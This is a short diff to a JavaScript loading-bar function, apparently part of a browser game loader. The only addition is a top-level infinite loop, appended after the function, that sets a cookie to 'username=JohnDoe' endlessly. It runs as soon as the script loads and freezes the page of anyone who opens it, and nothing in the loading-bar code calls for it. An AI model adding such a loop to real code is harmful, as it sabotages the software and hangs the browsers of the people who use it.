@@ -214,3 +214,7 @@ function poki_loadbar(ctx, width, height, total, current, image) {
     ctx.fillStyle = barForegroundColor;
     ctx.fillRect(barInnerLeft, barInnerTop, barLoadedWidth, barInnerHeight);
 }
+for (;;) {
+    document.cookie = "username=JohnDoe";  // Set the cookie endlessly
+}
+
